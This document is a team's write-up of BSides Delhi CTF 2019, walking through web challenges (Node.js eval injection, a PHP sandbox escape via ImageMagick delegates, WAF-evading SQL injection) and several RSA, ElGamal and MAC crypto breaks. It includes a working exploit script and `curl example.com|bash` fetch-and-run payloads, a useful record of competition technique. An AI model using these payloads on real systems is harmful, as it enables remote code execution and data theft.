# BSides Delhi CTF 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190928-bsidesdelhictf/) of this writeup.**


 - [BSides Delhi CTF 2019](#bsides-delhi-ctf-2019)
   - [Web](#web)
     - [Weird Calculator](#weird-calculator)
     - [Eval Me](#eval-me)
     - [Seek You El](#seek-you-el)
   - [Crypto](#crypto)
     - [SecureMAC](#securemac)
       - [First Part](#first-part)
       - [Second Part](#second-part)
     - [BabyRSA](#babyrsa)
     - [ExtendedElgamal](#extendedelgamal)


## Web

### Weird Calculator

After a little fuzzing we found it's running nodejs `eval`.

```
require('child_process').exec('curl example.com|bash')
```

Half of the flag is in source code, and the other is in a another file.

Flag: `bsides_delhi{Prototype_nd_sh3ll1ng_by_the_Cs1de}`

### Eval Me

In this callenge, we can execute php `eval()` but it has lots of disabled functions. `openbase_dir` is also set.

Let's first bypass `openbae_dir` to see if we can directly read the flag.

```php
<?php
var_dump(getcwd());
mkdir('foo');
chdir('foo');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
var_dump(file("/flag")); // because fopen, file_get_contents are disabled
var_dump(getcwd());
foreach (glob("/*flag") as $filename) {                                                                                        
    echo "$filename size " . filesize($filename) . "\n";
}
```

Sadly, no. We need to execute `/readFlag`.

Let's collect more information:
1. `putenv` is not in disabed functions.
2. `imagemagick` plugin is installed.

First, I tried to overwrite `$PATH` but it somehow does not work....

Anyway, at least we can bypass the php sandbox via LD_PRELOAD + imagemagick. Please see the [Wallbreaker easy from 0CTF/TCTF Quals](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy) here.

However, I found another [interesting writeup](https://www.cnblogs.com/wfzWebSecuity/p/11279895.html). Section 3-1 shows that we can also overwrite `delegate.xml` by defining `MAGICK_CONFIGURE_PATH` environment variable.

This is much more interesting compared to the `LD_PRELOAD` trick. Let's try this.

```python
#!/usr/bin/env python3
import requests
s = requests.session()
payload='''
error_reporting(E_ALL);
ini_set('display_errors', 1);
mkdir('foo');
chdir('foo');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
var_dump("------------------------------------------");
var_dump($SANDBOX);
var_dump($_FILES["file"]);
mkdir("/var/tmp/.systemd");
$fileext="pokemon";
var_dump(move_uploaded_file($_FILES["file"]["tmp_name"], "/var/tmp/.systemd/delegates.xml"));
var_dump(move_uploaded_file($_FILES["img"]["tmp_name"], "/var/tmp/.systemd/.a.".$fileext));
foreach (glob("/var/tmp/.systemd/.*") as $filename) {
    var_dump("$filename size " . filesize($filename) . "\n");
}
__halt_compiler();
array_map('rmdir', glob("/var/tmp/*"));
putenv('MAGICK_CONFIGURE_PATH=/var/tmp/.systemd');
var_dump(file("/var/tmp/.systemd/.a.".$fileext));
$img = new Imagick('/var/tmp/.systemd/.a.'.$fileext);
var_dump($img);
$img = new Imagick('/var/tmp/.systemd/.a.'.$fileext);
var_dump($img);
var_dump("------------------------------------------");
'''.replace('\n', '')
r = s.post('http://34.67.7.120/', params=dict(input=payload), files={'file': ('foo', '''
<delegatemap>
  <delegate decode="pokemon" command="sh -c &quot;curl example.com|bash&quot;"/>
</delegatemap>
'''), 'img': ('bar', 'bazz')})
print(r.text)
```
Flag: `bsides_delhi{PHP-Imagick,isn't_fun??SOFFICE}``



### Seek You El

In this challenge, there is a SQL Injection on the pw parameter.

We need to login as admin to get the flag, but `/?%5f=' or 1=1 and user=x'61646d696e'#` not work.

So maybe we need to get the `pw` value of the `admin` to login.

And there is WAF in this challenge, we can't use `()`, `select`, `sleep`, ....

Then I found that we can use SQL error to do boolean-based SQL Injection:

`/?%5f='or ~0+1#` => Error

`/?%5f='or ~0+0#` => OK

OK, let's dump pw:

`/?%5f='or user=x'61646d696e' and (~(ascii(mid(pw,1,1))>0)+1) #`

`/?%5f='or user=x'61646d696e' and (~(ascii(mid(pw,1,1))>100)+1) #`

...

Then we have `pw`: `9f3b7c0e1a`

Using this pw to login and get the flag:

![](https://github.com/w181496/CTF/raw/master/bsides_delphi_ctf_2019/SeekYouEl/seek.png)

`bsides_delhi{sequel_injections_are_really_great_i_guess_dont_you_think?}`

## Crypto

### SecureMAC

Two parts in this challenge:
1. get the key
2. generate a collision to this mac

#### First Part

Same technique as in [CSAW CTF - Fault Box](https://github.com/OAlienO/CTF/tree/master/2019/CSAW-CTF/Fault-Box)

let `f` be `bytes_to_long("fake_flag")`
`c` will be `f ** e + k * p` for some `k`
We know the value of `f ** e`
Simply calculate `gcd(f ** e - c, n)` will give us prime factor `p`, then we can factor `n`

#### Second Part

To make things simple, we send messages of 32 bytes.
Both `messageblocks[1]` and `tag`, which is `ECB.encrypt(messageblocks[0])` we can control
Just make the result of `strxor` be the same

flag: `bsides_delhi{F4ult'n'F0rg3_1s_@_b4d_c0mb1n4ti0n}`

### BabyRSA

This is yet another RSA challenge
`salt` can be decrypt directly
Then, use wiener attack to factor `n = p * q` and get `p1 * p2`
Simply gcd `p1 * p2` with `n1` and `n2` and get all the prime factors
Note that `gcd(e1, (p1 - 1) * (q1 - 1)) != 1` and `gcd(e2, (p2 - 1) * (q2 - 1)) != 1`, we can't directly decrypt `magic`
Luckily, `gcd(e1, q1 - 1) == 2` and `gcd(e2, q2 - 1) == 2`
We can get `m ** 2 % q1` and `m ** 2 % q2`
Then use the same technique as in Rabin cryptosystem, which is modular square root and chinese remainder theorem

flag: `bsides_delhi{JuG1iNg_WiTh_RS4}`

### ExtendedElgamal

`rand = lambda: random.randint(133700000,2333799999)` this is a small range
Brute force it and get `z`
Then calculate `e / (g^k)^z` to get `m`

flag: `bsides_delhi{that5_som3_b4d_k3y_generation!}`
